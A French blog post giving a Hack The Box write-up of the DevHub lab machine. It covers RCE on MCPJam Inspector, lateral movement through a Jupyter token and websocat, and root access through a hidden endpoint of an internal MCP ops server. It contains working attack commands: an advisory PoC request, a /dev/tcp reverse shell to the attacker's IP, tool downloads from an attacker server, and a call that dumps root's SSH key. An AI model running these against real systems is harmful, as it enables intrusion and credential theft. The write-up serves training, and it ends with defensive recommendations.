---
layout: post
title: "Write-up HTB DevHub (Season 11)"
date: 2026-08-02 15:35:00
description: RCE sur MCPJam Inspector, mouvement latéral via Jupyter/websocat et privilege escalation root via un endpoint caché d'un serveur MCP interne.
tags: [htb, writeup, linux, mcp, rce, privesc]
categories: [Write-ups]
giscus_comments: true
related_posts: false
---

**Machine** : DevHub (HTB Season 11) — Medium, Linux
**Auteur** : DoOm / ppporrkkky
**Profil HTB** : [https://profile.hackthebox.com/profile/019c56c9-a8f8-721d-ad7b-fd7b3dd2f9de](https://profile.hackthebox.com/profile/019c56c9-a8f8-721d-ad7b-fd7b3dd2f9de)

## Reconnaissance

{% include figure.liquid path="assets/img/devhub-writeups/01-htb-info-card.png" class="img-fluid rounded z-depth-1" %}

Une fois l'adresse IP cible obtenue, on démarre la reconnaissance avec `nmap` :

```
nmap 10.129.245.216 -T5 -sCV -p-
```

{% include figure.liquid path="assets/img/devhub-writeups/03-nmap-scan.png" class="img-fluid rounded z-depth-1" %}

Le scan révèle trois ports ouverts :

- **22/tcp** — OpenSSH 8.9p1 (Ubuntu)
- **80/tcp** — nginx 1.18.0, redirection vers `http://devhub.htb/`
- **6274/tcp** — un service non identifié par nmap, mais dont les headers de réponse permettent d'identifier un **MCPJam Inspector**

En visitant le site sur le port 80, on découvre une page interne intitulée **DevHub — Internal Development & Analytics Platform**, qui référence trois services :

- **MCP Inspector** — actif sur le port 6274
- **Analytics Dashboard** — un environnement Jupyter, accessible uniquement en interne sur `localhost:8888`
- **Code Repository** — un serveur Git interne, en mode maintenance

{% include figure.liquid path="assets/img/devhub-writeups/02-devhub-homepage.png" class="img-fluid rounded z-depth-1" %}

Le service Jupyter en localhost:8888 est noté comme surface d'attaque potentielle, mais n'est pas la priorité immédiate.

## Exploitation initiale — RCE sur MCPJam Inspector

Le port 6274 expose donc un serveur MCP accessible depuis Internet. La page **Settings** de l'interface révèle la version exacte du logiciel :

{% include figure.liquid path="assets/img/devhub-writeups/04-mcpjam-inspector.png" class="img-fluid rounded z-depth-1" %}

```
MCPJam Version: v1.4.2
```

Une recherche sur les avis de sécurité GitHub confirme que cette version est vulnérable :

> **GHSA-232v-j27c-5pp6** — REC in MCPJam inspector due to HTTP Endpoint exposes (Critical severity)
> Package `@mcpjam/inspector` (npm) — versions affectées : `<= 1.4.2`, patché en `1.4.3`

{% include figure.liquid path="assets/img/devhub-writeups/05-ghsa-advisory.png" class="img-fluid rounded z-depth-1" %}

La PoC officielle du GitHub Advisory permet un RCE via une simple requête HTTP :

```bash
curl http://<cible>:6274/api/mcp/connect --header "Content-Type: application/json" --data \
  "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"
```

{% include figure.liquid path="assets/img/devhub-writeups/06-poc-code.png" class="img-fluid rounded z-depth-1" %}

Dans notre cas, la cible est très probablement une machine Linux : on adapte donc la PoC pour obtenir un reverse shell, en s'appuyant sur une variante Python disponible sur Exploit-DB ([exploit 52625](https://www.exploit-db.com/exploits/52625)).

Après avoir démarré un listener :

```bash
nc -lvnp 4444
```

… on lance l'exploit avec les paramètres adaptés (IP et port du listener). Le shell est obtenu :

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

{% include figure.liquid path="assets/img/devhub-writeups/07-shell-obtained.png" class="img-fluid rounded z-depth-1" %}

### Stabilisation du shell

Pour transformer ce reverse shell basique en shell pleinement interactif :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Puis, une fois le PTY lancé, `Ctrl+Z` pour repasser en arrière-plan côté attaquant, puis :

```bash
stty raw -echo; fg
```

Après `fg`, appuyer deux fois sur Entrée, puis dans le shell distant :

```bash
export TERM=xterm
```

Cela active la coloration, `clear`, et les programmes interactifs comme `vim` ou `less`. (Alternative plus simple si `rlwrap` est installé côté attaquant : lancer directement `rlwrap nc -lvnp 4444`, ce qui donne l'historique et l'édition de ligne sans upgrade Python.)

## Énumération système et mouvement latéral

Avant de lancer `linpeas.sh` sur la cible, il faut l'y transférer. La méthode la plus simple consiste à démarrer un petit serveur HTTP côté attaquant, dans le dossier contenant le script :

```bash
python3 -m http.server 8000
```

Puis, depuis le shell obtenu sur la cible, on récupère le script avec `wget` ou `curl` et on le rend exécutable :

```bash
wget http://<IP_attaquant>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
```

Une fois `linpeas.sh` transféré, on le lance pour scanner le système. Deux éléments intéressants ressortent de la liste des processus :

{% include figure.liquid path="assets/img/devhub-writeups/08-linpeas-processes.png" class="img-fluid rounded z-depth-1" %}

1. **Un serveur Jupyter lancé par l'utilisateur `analyst`**, en localhost, avec un **token en dur** dans la ligne de commande :

```
/home/analyst/jupyter-env/bin/python3 -m jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser \
  --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
```

2. **Un process cron lancé par `root`** exécutant un script Python :

```
root  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Une vérification des tâches cron confirme ce process root régulier :

{% include figure.liquid path="assets/img/devhub-writeups/09-cron-jobs.png" class="img-fluid rounded z-depth-1" %}

Le token Jupyter en dur ouvre la voie à un mouvement latéral vers l'utilisateur `analyst`. En interagissant avec l'API Jupyter, on peut créer un terminal distant :

```bash
curl -X POST 'http://127.0.0.1:8888/api/terminals' \
  -H 'Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' \
  -H 'Content-Type: application/json' \
  -d '{"cwd":""}' \
  -i
```

Réponse : `{"name": "1", "last_activity": "2026-08-02T13:01:56.865857Z"}` — on obtient un ID de terminal (`1`).

Les commandes s'envoient ensuite via websocket, avec le binaire [websocat](https://github.com/vi/websocat/releases/download/v1.13.0/websocat.x86_64-unknown-linux-musl). Le transfert se fait de la même façon que pour `linpeas.sh` : on sert le binaire depuis la machine attaquante avec le serveur Python déjà lancé, puis on le récupère depuis le shell `mcp-dev` (ou celui de `analyst` une fois obtenu) :

```bash
wget http://<IP_attaquant>:8000/websocat.x86_64-unknown-linux-musl -O /tmp/websocat
chmod +x /tmp/websocat
```

Une fois le binaire en place, on peut envoyer les requêtes via terminal :

```bash
echo '["stdin", "ls -la\r"]' | ./websocat.x86_64-unknown-linux-musl \
  "ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

On obtient une session interactive avec l'utilisateur `analyst`. Pour un accès plus confortable, on déclenche un reverse shell vers un second listener :

```bash
nc -lvnp 9000
```

```bash
echo '["stdin", "bash -i >& /dev/tcp/<IP_attaquant>/9000 0>&1\r"]' | ./websocat.x86_64-unknown-linux-musl \
  "ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

{% include figure.liquid path="assets/img/devhub-writeups/10-analyst-shell.png" class="img-fluid rounded z-depth-1" %}

Le shell `analyst` est obtenu, puis stabilisé avec la même méthode que précédemment. Le flag utilisateur se trouve dans `~/user.txt`.

{% include figure.liquid path="assets/img/devhub-writeups/11-user-flag.png" class="img-fluid rounded z-depth-1" %}

## Privilege escalation — endpoint caché du serveur OpsMCP

En listant le répertoire personnel de `analyst`, un fichier attire l'attention : `.opsmcp_key`.

```
analyst@devhub:~$ cat .opsmcp_key
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

Le nom du fichier correspond au process cron root vu précédemment (`/opt/opsmcp/server.py`). Le répertoire `/opt/opsmcp/` révèle que `server.py` appartient à `analyst` (lecture seule) :

{% include figure.liquid path="assets/img/devhub-writeups/12-opsmcp-key-file.png" class="img-fluid rounded z-depth-1" %}

```
analyst@devhub:~$ ls -la /opt/opsmcp/
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 server.py
```

**OpsMCP** est un serveur MCP (Model Context Protocol) orienté opérations système : il expose des outils d'administration système (exécution de commandes, lecture de fichiers, gestion de processus, logs, services) à un LLM via le protocole MCP. Comme il tourne en tant que **root**, tout outil exploitable dans ce serveur s'exécute avec des privilèges root.

En lisant `server.py`, la clé API codée en dur correspond exactement à `.opsmcp_key` :

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

Le serveur écoute en local sur le port 5000 :

```python
app.run(host='127.0.0.1', port=5000, debug=False)
```

En listant les outils disponibles via l'API :

```bash
curl 127.0.0.1:5000/tools/list -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

{% include figure.liquid path="assets/img/devhub-writeups/13-tools-list.png" class="img-fluid rounded z-depth-1" %}

… la réponse ne montre que 4 outils "publics" (`ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`). Mais en lisant le code source complet de `server.py`, un outil non listé apparaît : **`ops._admin_dump`**, qui permet de dumper des identifiants sensibles (clé privée SSH root, ou hashs de mots de passe), sous réserve d'un paramètre `confirm=true`.

{% include figure.liquid path="assets/img/devhub-writeups/14-admin-dump-code.png" class="img-fluid rounded z-depth-1" %}

On déclenche cet endpoint caché pour récupérer la clé privée SSH de root :

```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }'
```

La réponse contient la clé privée root, encodée avec des retours à la ligne échappés (`\n`). Un petit script Python permet de la nettoyer avant utilisation :

```python
#!/usr/bin/env python3
import os, subprocess, sys

def sanitize_key(input_path="enigma_root_key"):
    try:
        print(f"[*] Traitement du fichier : {input_path}")
        try:
            subprocess.run(["dos2unix", input_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            print("[+] Conversion dos2unix effectuée avec succès.")
        except (FileNotFoundError, subprocess.CalledProcessError):
            print("[-] 'dos2unix' non disponible, nettoyage manuel...")
        with open(input_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        content = content.replace("\\n", "\n").replace("\r\n", "\n")
        content = content.rstrip("\\").strip()
        content = content.rstrip("\n") + "\n"
        with open(input_path, "w", encoding="utf-8") as f:
            f.write(content)
        os.chmod(input_path, 0o400)
        print(f"[+] Clé nettoyée et permissions (400) appliquées sur '{input_path}'.")
    except Exception as e:
        print(f"[-] Erreur critique : {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    target_file = sys.argv[1] if len(sys.argv) > 1 else "enigma_root_key"
    sanitize_key(target_file)
```

```bash
python3 sanitize_key.py enigma_root_key
chmod 400 enigma_root_key
ssh -i enigma_root_key root@10.129.245.216
```

{% include figure.liquid path="assets/img/devhub-writeups/15-root-ssh-success.png" class="img-fluid rounded z-depth-1" %}

L'accès root est obtenu. Le flag root se trouve dans `/root/root.txt`.

{% include figure.liquid path="assets/img/devhub-writeups/16-root-flag.png" class="img-fluid rounded z-depth-1" %}

## Recommandations

- Mettre à jour régulièrement les applications et frameworks exposés (MCPJam Inspector notamment).
- Ne jamais coder en dur des tokens ou clés d'API dans les scripts ou les lignes de commande de processus visibles.
- Éviter d'implémenter des fonctionnalités critiques et destructrices (comme la récupération de la clé SSH root) accessibles via une API, même « cachée » — la sécurité par l'obscurité n'est pas une protection.
- Restreindre les permissions des processus cron exécutés en root lorsqu'ils interagissent avec des composants modifiables par des comptes à moindre privilège.
